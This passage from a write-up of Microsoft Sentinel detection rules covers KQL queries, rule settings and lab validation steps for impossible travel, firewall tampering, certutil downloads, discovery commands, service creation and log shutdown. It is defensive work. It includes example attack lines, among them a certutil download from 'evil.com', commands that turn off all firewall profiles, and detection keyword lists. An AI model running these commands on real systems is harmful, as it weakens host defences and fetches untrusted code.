    SOC Analyst Assigned to revoke sessions and reset passwords

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Two successful sign-ins (`ResultType == 0`) occur for the same `UserPrincipalName`.
* Both sign-ins have valid latitude and longitude coordinates.
* The required travel speed between the two locations exceeds **900 km/h**.
* The distance between the two locations is greater than **500 km**.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if all the entities match (recommended).

### Why group alerts by all matching entities?
If an attacker utilizes an automated script via a VPN or proxy that triggers multiple impossible travel conditions from the same IP against the same user account, grouping consolidates these into a single incident to prevent alert fatigue.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 214335" src="https://github.com/user-attachments/assets/4ac7f0c9-0b53-49e5-8de0-e408d1601dd8" />

---

## 🤖 Automation Rules
This rule is linked to the following automated response:
* **known ip addreess:** Triggers when an incident is created to change the incident status (useful for whitelisting expected corporate VPN gateways or known egress points).

<img width="1920" height="1020" alt="Screenshot 2026-08-03 214341" src="https://github.com/user-attachments/assets/2da25af3-ecf4-440d-8df8-ba94d88918ac" />

---

## ✅ Validation
This detection can be validated by logging into a monitored Entra ID account from your local workstation, immediately connecting to a VPN with an egress node in a different country (e.g., over 500km away), and logging in again successfully within a few minutes. Sentinel will detect the geographic velocity anomaly and generate an incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 214351" src="https://github.com/user-attachments/assets/a5fc154c-6b43-4ea4-95d4-8ec97da090ae" />

---

## 🎯 Security Impact
This detection helps security teams:
* Identify compromised user credentials that have bypassed multi-factor authentication (MFA) or session controls.
* Rapidly detect account takeover (ATO) before the attacker can access sensitive data or establish persistence.
* Pinpoint malicious infrastructure and anomalous IP addresses interacting with cloud environments.

---

⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# 🧱 Firewall Disabled

## 🎯 Objective
This rule detects system modifications that turn off or impair the Windows Defender Firewall. It alerts security teams to defense evasion tactics indicating an attacker is attempting to disable network perimeter blocks before moving laterally or exfiltrating data.

---

## 📖 Threat Overview
Adversaries frequently disable host-based firewalls to facilitate network reconnaissance, enable remote administration tools (such as RDP or SMB), or establish outbound Command and Control (C2) connections. By utilizing built-in utilities like `netsh` or PowerShell cmdlets (`Set-NetFirewallProfile`), attackers can drop network barriers on compromised endpoints to ease lateral movement across the internal network.

---

## 🔥 Severity
**Medium**

<img width="1920" height="1020" alt="Screenshot 2026-08-03 214851" src="https://github.com/user-attachments/assets/3951a42e-9788-4b77-8c17-0d502b7781c5" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Defense Evasion | Impair Defenses: Disable or Modify System Firewall | T1562.004 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688 - Process Creation)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for process creation events where the command line contains known administrative syntax used to disable or turn off the Windows Firewall profiles:

    SecurityEvent
    | where EventID == 4688
    | where CommandLine has_any (
        "netsh advfirewall set allprofiles state off",
        "Set-NetFirewallProfile",
        "Disable-NetFirewall"
    )
    | project TimeGenerated, Computer, Account, Process, CommandLine
<img width="1920" height="1020" alt="Screenshot 2026-08-03 214914" src="https://github.com/user-attachments/assets/588dc538-1d58-4967-84be-9d70485791c5" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect firewall tampering instantly. |
| **Severity** | Medium | Disabling host firewalls increases vulnerability to network attacks and lateral movement. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every distinct instance of firewall modification commands. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Account:** Identifies the user account executing the firewall modification.
* **Host:** Highlights the endpoint that has had its network protections weakened.
* **Process:** Extracts the exact `CommandLine` arguments used to disable the profiles.
<img width="1920" height="1020" alt="Screenshot 2026-08-03 214923" src="https://github.com/user-attachments/assets/63832465-b8ed-4e36-b01b-b03725f4fcc4" />

---

## 🔄 Detection Workflow

    Attacker executes a command to disable the firewall (e.g., netsh advfirewall set allprofiles state off)
                │
                ▼
    Target Host logs Event ID 4688 (Process Creation)
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
                │
                ▼
    CommandLine matches firewall disable strings
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Grouped by Account and Host)
                │
                ▼
    SOC Analyst Assigned & Host Network Profile Verification Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is logged.
* The `CommandLine` field contains firewall-disabling syntax such as `"netsh advfirewall set allprofiles state off"`, `"Set-NetFirewallProfile"`, or `"Disable-NetFirewall"`.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host**.

### Why group alerts by Account and Host?
If multiple firewall profiles (Domain, Private, Public) are turned off sequentially in a single script execution, grouping by Account and Host combines these events into one coherent incident ticket.
<img width="1920" height="1020" alt="Screenshot 2026-08-03 214937" src="https://github.com/user-attachments/assets/27507c1e-c90e-4d4a-a4f2-8a183768b5e2" />

---
## 🤖 Automation Rules
This rule is linked to an automated response:
* **firewall disabled:** Triggers automatically upon incident creation to add a predefined triage task for the SOC analyst.
<img width="1920" height="1020" alt="Screenshot 2026-08-03 214945" src="https://github.com/user-attachments/assets/a71a87b3-a588-426c-8e83-a7d052401cad" />


---

## ✅ Validation
This detection can be validated in a lab environment by opening an elevated Command Prompt or PowerShell window and executing `netsh advfirewall set allprofiles state off` (ensure you immediately revert this afterward by running `netsh advfirewall set allprofiles state on`). Microsoft Sentinel will capture the 4688 event and generate an incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 214951" src="https://github.com/user-attachments/assets/0ce911f8-8a63-48af-8cbc-b640a1a3953f" />

---


## 🎯 Security Impact
This detection helps security teams:
* Identify defense evasion attempts designed to clear paths for lateral movement.
* Spot compromised hosts losing their perimeter protection layers.
* Enforce compliance and rapid remediation on unprotected endpoints.


---



⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---

# 📥 Certutil Download

## 🎯 Objective
This rule detects the abuse of the legitimate `certutil.exe` administrative binary to download files from remote locations. It alerts security teams to Living off the Land (LotL) tactics used by threat actors to fetch secondary payloads and binaries.

---

## 📖 Threat Overview
`certutil.exe` is a native Windows utility designed for managing Certificate Services. However, because it is signed by Microsoft and trusted by default, attackers frequently abuse its built-in URL caching and decoding features (using flags like `-urlcache`, `-split`, or http requests) to bypass security controls and download malicious files from external command-and-control servers directly onto disk.

---

## 🔥 Severity
**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-03 215444" src="https://github.com/user-attachments/assets/a62da438-355f-43ac-8163-aba4233cb06a" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Command And Control | Ingress Tool Transfer | T1105 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688 - Process Creation)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for process creation events involving `certutil.exe` combined with known download arguments or web protocols:

    SecurityEvent
    | where EventID == 4688
    | where Process has "certutil.exe"
    | where CommandLine has_any ("-urlcache", "-split", "http://", "https://")
    | project TimeGenerated, Computer, Account, Process, CommandLine

<img width="1920" height="1020" alt="Screenshot 2026-08-03 215528" src="https://github.com/user-attachments/assets/541ad731-fada-4afa-b41c-1656400b8dd9" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect Living off the Land file transfers immediately. |
| **Severity** | High | Using certutil to retrieve external files is a classic, highly reliable indicator of malicious ingress transfer. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every individual instance of malicious certutil execution. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Account:** Identifies the user or compromised account executing the download.
* **Host:** Highlights the endpoint where the external file is being downloaded.
* **Process:** Extracts the exact `CommandLine` arguments, revealing the specific URL and download flags used.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 215539" src="https://github.com/user-attachments/assets/d6a6d06f-9e38-446a-84e4-63e75b4d89ed" />

---

## 🔄 Detection Workflow

    Attacker executes certutil to download an external payload (e.g., certutil -urlcache -split -f http://evil.com/payload.exe)
                │
                ▼
    Target Host logs Event ID 4688 (Process Creation)
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
                │
                ▼
    Process matches certutil.exe and CommandLine contains download indicators
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Grouped by Account and Host)
                │
                ▼
    SOC Analyst Assigned & Payload Deobfuscation / Host Isolation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is logged.
* The `Process` field references `"certutil.exe"`.
* The `CommandLine` field contains download-related flags or protocols such as `"-urlcache"`, `"-split"`, `"http://"`, or `"https://"`.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host**.

### Why group alerts by Account and Host?
If an adversary executes multiple download commands or queries cache states sequentially on the same host, grouping by Account and Host bundles these related events into a single unified incident ticket for the analyst.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 215548" src="https://github.com/user-attachments/assets/a1176e40-55c5-47d7-8361-0480d45c3ce8" />

---

## ✅ Validation
This detection can be validated in a lab environment by opening an elevated command prompt and executing a benign test download command, such as `certutil.exe -urlcache -split -f http://example.com/test.txt`. Microsoft Sentinel will capture the 4688 event and generate an incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 215601" src="https://github.com/user-attachments/assets/bde97f09-cb3f-4c3c-8aea-2691cb8e6d51" />


---

## 🎯 Security Impact
This detection helps security teams:
* Identify Living off the Land (LotL) binary abuse that evades traditional signature-based antivirus.
* Capture external URLs and threat actor infrastructure leveraged during the ingress tool transfer stage.
* Stop malware and secondary payloads from landing on sensitive corporate endpoints.

---
⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---


# 🔍 Network Discovery

## 🎯 Objective
This rule detects the execution of native Windows commands aimed at mapping internal network topologies, routing tables, and active network connections. It alerts security teams to early-stage adversary reconnaissance.

---

## 📖 Threat Overview
After gaining initial access to a system, threat actors frequently perform internal reconnaissance to understand their network environment. By using built-in administrative tools like `ipconfig`, `arp`, `netstat`, `route`, `nslookup`, and `ping`, attackers can discover local IP configurations, active connections, neighboring hosts, and DNS infrastructure without dropping custom scanning tools to disk.

---

## 🔥 Severity
**Medium**

<img width="1920" height="1020" alt="Screenshot 2026-08-03 221138" src="https://github.com/user-attachments/assets/3da534d1-ba6f-4493-9785-7e9b2d34f0fb" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Discovery | System Network Configuration Discovery | T1016 |
| Discovery | Network Service Discovery | T1046 |
| Discovery | System Information Discovery | T1082 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 4688 - Process Creation)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for process creation events where native network discovery and configuration binaries are executed:

    SecurityEvent
    | where EventID == 4688
    | where Process has_any ("ipconfig.exe", "arp.exe", "netstat.exe", "route.exe", "nslookup.exe", "ping.exe")
    | project TimeGenerated, Computer, Account, Process, CommandLine

<img width="1920" height="1020" alt="Screenshot 2026-08-03 221218" src="https://github.com/user-attachments/assets/a63520d8-0d3e-45fa-badf-fbfc0a96772e" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect reconnaissance commands instantly. |
| **Severity** | Medium | While these tools have legitimate administrative uses, concentrated execution points to pre-attack enumeration. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures individual discovery executions. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | Account |
| Host | HostName | Computer |
| Process | CommandLine | CommandLine |

### Why map these entities?
* **Account:** Identifies the user or compromised identity performing the network scan.
* **Host:** Highlights the endpoint where the reconnaissance commands were run.
* **Process:** Extracts the exact `CommandLine` arguments used during the discovery phase.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 221227" src="https://github.com/user-attachments/assets/db5dd2a2-ccb5-468e-b6df-a340011317da" />

---

## 🔄 Detection Workflow

    Attacker runs discovery commands (e.g., ipconfig /all or netstat -ano)
                │
                ▼
    Target Host logs Event ID 4688 (Process Creation)
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
                │
                ▼
    Process matches discovery binary list
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Grouped by Account and Host)
                │
                ▼
    SOC Analyst Assigned & Host Activity Investigation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **4688** is logged.
* The `Process` field matches any of the discovery utilities: `ipconfig.exe`, `arp.exe`, `netstat.exe`, `route.exe`, `nslookup.exe`, or `ping.exe`.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Enabled**.
* **Grouping Time Window:** 5 Hours.
* **Grouping Method:** Grouping alerts into a single incident if the selected entity types and details match: **Account** and **Host**.

### Why group alerts by Account and Host?
Adversaries typically run scripts that execute multiple discovery commands back-to-back (`ipconfig` followed by `arp`, then `netstat`). Grouping by Account and Host bundles these sequential queries into a single consolidated incident.
<img width="1920" height="1020" alt="Screenshot 2026-08-03 221244" src="https://github.com/user-attachments/assets/bab5b8d8-8a56-4b09-85aa-0dcd4f2cb71c" />


---

## ✅ Validation
This detection can be validated in a lab environment by opening a command prompt and executing a network discovery command such as `ipconfig /all` or `arp -a`. Microsoft Sentinel will capture the 4688 event and generate an incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 221259" src="https://github.com/user-attachments/assets/72e944d0-2d17-4de3-a666-3618641f16b3" />

---

## 🎯 Security Impact
This detection helps security teams:
* Uncover internal adversary reconnaissance before lateral movement occurs.
* Track malicious enumeration scripts executed on endpoints.
* Gain early visibility into threat actor behavior during the initial access or discovery phase.

---


⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---


# 🌐 Suspicious Outbound Connection

## 🎯 Objective
This rule detects outbound network connections established to known malicious IP addresses or external indicators tracked by threat intelligence feeds. It alerts security teams to potential Command and Control (C2) communication or data exfiltration.

---

## 📖 Threat Overview
When endpoints are compromised, malware or threat actors frequently establish outbound connections to external Command and Control (C2) servers, malicious drop zones, or known threat infrastructure. By performing an inner join between device network logs and active threat intelligence indicators (`ThreatIntelligenceIndicator`), security systems can instantly spot telemetry matching malicious external IPs.

---

## 🔥 Severity
**Medium**
<img width="1920" height="1020" alt="Screenshot 2026-08-03 221802" src="https://github.com/user-attachments/assets/88541bd3-8357-47b6-8521-c8934c325c75" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Command And Control, Exfiltration | Exfiltration Over C2 Channel | T1041 |

---

## 📂 Data Sources
* Microsoft Defender XDR (`DeviceNetworkEvents`)
* Threat Intelligence Indicators (`ThreatIntelligenceIndicator`)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query correlates successful outbound device connections with active threat intelligence indicators to identify communication with malicious remote IPs:

    DeviceNetworkEvents
    | where ActionType == "ConnectionSuccess"
    | join kind=inner (
        ThreatIntelligenceIndicator
        | where Active == true
        | where isnotempty(NetworkIP) or isnotempty(NetworkDestinationIP)
        | project IndicatorIP = coalesce(NetworkIP, NetworkDestinationIP), Description, ConfidenceScore
    ) on $left.RemoteIP == $right.IndicatorIP
    | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, Description, ConfidenceScore

<img width="1920" height="1020" alt="Screenshot 2026-08-03 221828" src="https://github.com/user-attachments/assets/c0cfb9e2-0d9b-4e8e-a097-5f4d255f5180" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to identify threat intel matches the moment a connection succeeds. |
| **Severity** | Medium | Communicating with a flagged threat intel indicator represents suspicious external traffic requiring review. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures distinct outbound connection events to malicious indicators. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | FullName | DeviceName |

### Why map this entity?
* **Host:** Identifies the exact endpoint on the internal network that successfully connected to the malicious external IP address.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 221849" src="https://github.com/user-attachments/assets/82bb90bf-04e3-4ef1-9e7e-a8f2fc13f029" />

---

## 🔄 Detection Workflow

    Compromised host initiates an outbound connection to an external IP
                │
                ▼
    Defender logs DeviceNetworkEvents (ConnectionSuccess)
                │
                ▼
    Microsoft Sentinel NRT Rule joins network events with ThreatIntelligenceIndicator data
                │
                ▼
    RemoteIP matches an active threat intelligence indicator IP
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (No alert grouping)
                │
                ▼
    SOC Analyst Assigned & Host Network Isolation / C2 Investigation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* A device network event logs a successful outbound connection (`ActionType == "ConnectionSuccess"`).
* The remote IP (`RemoteIP`) matches an active indicator IP (`IndicatorIP`) from the threat intelligence feed.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Outbound communication with known malicious threat intelligence infrastructure indicates a high-priority risk. Disabling alert grouping ensures every unique connection attempt generates an independent incident ticket for immediate SOC visibility.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 221855" src="https://github.com/user-attachments/assets/c8568962-426f-4048-8498-9232997c9265" />

---

## ✅ Validation
This detection can be validated by simulating an outbound connection attempt from a test machine to a safe, controlled threat intelligence test IP or a custom indicator injected into the Threat Intelligence workspace table. Sentinel will evaluate the join condition and generate an incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-03 221909" src="https://github.com/user-attachments/assets/5c8609a5-2f6e-4811-911b-b8e278a3e5ab" />

---

## 🎯 Security Impact
This detection helps security teams:
* Identify active Command and Control (C2) callbacks or beaconing behavior.
* Catch data exfiltration attempts pointing toward malicious external servers.
* Isolate infected hosts instantly before attackers can expand their footprint.

---


⬆️ **[Back to Analytics Rule Summary](#-analytics-rule-summary)**

---
# ⚙️ Create or Modify System Process

## 🎯 Objective
This rule detects the creation or modification of system processes and services (specifically tracking Windows Event IDs 4697 and 7045 related to new service installations). It alerts security teams to potential persistence mechanisms established by threat actors.

---

## 📖 Threat Overview
Adversaries frequently create or modify Windows services to establish persistent access to a compromised system. Because Windows services run with high privileges (often as Local System) and can be configured to start automatically upon boot, dropping a malicious service executable or modifying an existing service binary allows attackers to maintain stealthy, long-term persistence across reboots.

---

## 🔥 Severity
**Medium**

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154122" src="https://github.com/user-attachments/assets/9377445b-4936-4fc1-a18b-d4d8a1e2e9b1" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Persistence, Privilege Escalation | Create or Modify System Process: Windows Service | T1543.003 |

---

## 📂 Data Sources
* Windows Security and System Event Logs (Event IDs 4697 and 7045 - A new service was installed)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for service installation events (`4697` and `7045`) to track newly introduced system processes:

    SecurityEvent
    | where EventID in (4697, 7045)
    | project TimeGenerated, Computer, SubjectAccount, EventID, Activity
<img width="1920" height="1020" alt="Screenshot 2026-08-04 154141" src="https://github.com/user-attachments/assets/b5e4c958-60df-462e-b250-4aa770741c0f" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect service-based persistence as it is installed. |
| **Severity** | Medium | While legitimate administrative tools install services, unauthorized new services often indicate persistence. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every distinct service installation event. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Host | FullName | Computer |
| Account | Name | SubjectAccount |

### Why map these entities?
* **Host:** Identifies the target endpoint or server where the new service was installed.
* **Account:** Identifies the user account or administrator context that registered the service.
<img width="1022" height="349" alt="Screenshot 2026-08-04 154151" src="https://github.com/user-attachments/assets/12b44956-e38d-4f32-938b-5044a05771fd" />


---

## 🔄 Detection Workflow

    Attacker installs a malicious Windows service for persistence
                │
                ▼
    Target Host logs Event ID 4697 or 7045 (New service installed)
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
                │
                ▼
    EventID matches 4697 or 7045
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Alert grouping disabled)
                │
                ▼
    SOC Analyst Assigned & Service Binary Path Investigation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Event ID **4697** or **7045** is logged.
* The event indicates a new service installation on the host system.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Service installations are generally infrequent in locked-down production environments. Disabling grouping ensures that every new service installation generates a distinct, immediate ticket for verification.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154158" src="https://github.com/user-attachments/assets/dabfe3b2-780f-4382-97fd-5e826ea5842a" />

---

## ✅ Validation
This detection can be validated in a lab environment by installing a temporary test service using an elevated prompt (e.g., `sc.exe create TestService binPath= "cmd.exe"`). Microsoft Sentinel will capture the event and generate an incident. *(Ensure you delete the test service immediately after validation using `sc.exe delete TestService`).*

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154212" src="https://github.com/user-attachments/assets/69477517-9873-4c0c-b039-5c1b98ea5c4c" />

---

## 🎯 Security Impact
This detection helps security teams:
* Uncover hidden persistence mechanisms embedded within Windows services.
* Track unauthorized service installations across domain infrastructure.
* Investigate binary paths and parameters associated with newly spawned system processes.

---



⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

---


# 🛑 Event Logging Service Shut Down

## 🎯 Objective
This rule detects attempts to stop or disable the Windows Event Log service (specifically tracking Event ID 1100). It alerts security teams to defense evasion tactics used by adversaries attempting to blind logging infrastructure and cover their tracks.

---

## 📖 Threat Overview
To prevent security analysts and SIEM solutions from detecting malicious post-exploitation activities, threat actors often attempt to clear, tamper with, or outright stop the Windows Event Log service. Stopping the event logging service effectively blinds defenders by halting the recording of security-relevant system events on the host.

---

## 🔥 Severity
**Medium**

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154345" src="https://github.com/user-attachments/assets/0440abe8-71b0-46b6-8fc6-32f468347a55" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Defense Evasion | Impair Defenses: Disable Windows Event Logging | T1562.002 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event ID 1100 - The event logging service has shut down)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for the specific event ID indicating that the event logging service has stopped:

    SecurityEvent
    | where EventID == 1100
    | project TimeGenerated, Computer, SubjectAccount, Activity, EventID

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154403" src="https://github.com/user-attachments/assets/2f3c5893-0958-46da-86d8-a049e55e1186" />

---

## ⚙️ Rule Configuration
| Setting | Value | Reason |
|----------|-------|--------|
| **Rule Type** | Near Real-Time (NRT) Rule | Runs continuously to detect event log tampering instantly. |
| **Severity** | Medium | Shutting down logging services is a deliberate attempt to blind telemetry and evade detection. |
| **Status** | Enabled | Ensures the detection is currently active. |
| **Event Grouping** | Trigger an alert for each event | Captures every distinct event log shutdown occurrence. |
| **Suppression** | Not configured | Analyzes all logs continuously without a cool-down period. |

---

## 🧩 Entity Mapping
The following entities are mapped to enrich Microsoft Sentinel incidents and provide context for investigators.

| Entity | Identifier | Field |
|---------|------------|-------|
| Account | Name | SubjectAccount |
| Host | HostName | Computer |

### Why map these entities?
* **Account:** Identifies the user account or security context responsible for stopping the event logging service.
* **Host:** Highlights the specific system or endpoint where logging was disabled.
<img width="1920" height="1020" alt="Screenshot 2026-08-04 154412" src="https://github.com/user-attachments/assets/d395a4b5-b644-4ffe-8825-3785f943eef1" />

---

## 🔄 Detection Workflow

    Attacker attempts to stop the Windows Event Log service
                │
                ▼
    Target Host logs Event ID 1100 (Event Logging Service Shut Down)
                │
                ▼
    Azure Monitor Agent (AMA) ingests the event
                │
                ▼
    Microsoft Sentinel NRT Analytics Rule evaluates incoming events
                │
                ▼
    EventID equals 1100
                │
                ▼
    Alert Generated
                │
                ▼
    Incident Created (Alert grouping disabled)
                │
                ▼
    SOC Analyst Assigned & System Integrity Investigation Initiated

---

## 🚨 Alert Trigger Conditions
An alert is generated when all of the following conditions are met:
* Windows Security Event **1100** is logged.
* The event indicates that the event logging service has been shut down.

---

## 📋 Incident Configuration
* **Incident Creation:** Enabled.
* **Alert Grouping:** Group related alerts, triggered by this analytics rule, into incidents is **Disabled**.

### Why disable alert grouping?
Tampering with core logging services is a critical indicator of compromise. Disabling grouping ensures that every occurrence generates an immediate, independent incident ticket for the SOC.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154417" src="https://github.com/user-attachments/assets/53af12dc-13f0-4369-855a-5956a5983ba7" />

---

## ✅ Validation
This detection can be validated in a lab environment by testing administrative service controls or observing log generation patterns when the event log service state changes. Microsoft Sentinel will capture the 1100 event and generate an incident.

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154538" src="https://github.com/user-attachments/assets/1b34a848-1672-4b9d-b6d8-cf280db49e1b" />

---

## 🎯 Security Impact
This detection helps security teams:
* Detect active defense evasion attempts to blind system monitoring.
* Identify rogue administrators or compromised accounts trying to hide secondary malicious payloads.
* Maintain strict visibility over core endpoint telemetry channels.



⬆️ **[Back to Analytics Rule Summary](#analytics-rule-summary)**

---
# 👑 User Added to Local Administrators

## 🎯 Objective
This rule detects when a user account is added to local administrative groups on endpoints or servers (tracking Windows Security Event IDs 4732 and 4728). It alerts security teams to potential local privilege escalation and persistence.

---

## 📖 Threat Overview
Privilege escalation is a critical phase in an attack lifecycle. Once an adversary gains initial access to a machine via a standard user account, they look for local escalation vectors. Adding a user account to the local Administrators group provides the attacker with full control over the local system, allowing them to dump credentials, install backdoors, and move laterally across the network.

---

## 🔥 Severity
**High**

<img width="1920" height="1020" alt="Screenshot 2026-08-04 154850" src="https://github.com/user-attachments/assets/f746bb4c-2b7c-413f-ae56-fb5cc713f011" />

---

## 🛡️ MITRE ATT&CK Mapping
| Tactic | Technique | Technique ID |
|---------|-----------|--------------|
| Privilege Escalation, Persistence | Account Manipulation | T1098 |

---

## 📂 Data Sources
* Windows Security Event Logs (Event IDs 4732 and 4728 - A member was added to a security-enabled local or global group)
* Azure Monitor Agent (AMA)
* Log Analytics Workspace
* Microsoft Sentinel

---

## 📑 Detection Logic (KQL)
The following query monitors for security event IDs 4732 and 4728 to track additions to administrative security groups:

    SecurityEvent
    | where EventID in (4732, 4728)
    | project TimeGenerated, Computer, SubjectAccount, TargetAccount, Activity


<img width="1920" height="1020" alt="Screenshot 2026-08-04 154915" src="https://github.com/user-attachments/assets/4fc5a9ef-6258-42ee-af4a-05ed5c61bcbe" />

---

## ⚙️ Rule Configuration
